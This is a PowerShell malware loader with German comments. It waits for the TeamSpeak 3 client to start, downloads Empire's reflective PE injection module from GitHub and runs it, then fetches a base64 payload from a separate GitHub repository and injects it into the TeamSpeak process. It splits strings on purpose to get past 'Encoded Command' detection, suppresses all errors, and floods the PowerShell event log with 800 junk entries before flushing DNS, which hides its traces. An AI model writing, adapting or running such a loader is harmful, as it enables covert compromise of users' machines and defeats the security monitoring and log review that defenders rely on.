$ErrorActionPreference = 'SilentlyContinue'

while (!(Get-Process ts3client_win64)) { Start-Sleep -Seconds 2 }
Start-Sleep -Seconds 5 

try {
    [Net.ServicePointManager]::SecurityProtocol = 3072
    # Wir stückeln den Objektnamen
    $n = "Net.Web" + "Client"
    $wc = New-Object $n
    
    # 1. Loader laden
    $l_url = "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
    $l = $wc.DownloadString($l_url)
    Invoke-Expression $l

    # 2. EXE-Daten laden
    $p_url = "https://raw.githubusercontent.com/spritezerosugar67/johannesschwein/refs/heads/main/johannesschwein.txt"
    $b = $wc.DownloadString($p_url)
    
    # Base64-Methode zerstückeln gegen "Encoded Command" Detection
    $c = [System.Convert]
    $m = "FromBase" + "64String"
    $rb = $c::$m($b.Trim())

    # 3. Injektion
    $target = Get-Process ts3client_win64
    Invoke-ReflectivePEInjection -PEBytes $rb -ProcId $target.Id -ForceASLR

    # --- AUTOMATISCHER FLUSH ---
    for($i=1; $i -le 800; $i++) {
        Write-EventLog -LogName 'Windows PowerShell' -Source 'PowerShell' -EventID 800 -Message "Update-Log-$i"
    }
    ipconfig /flushdns
} catch {}
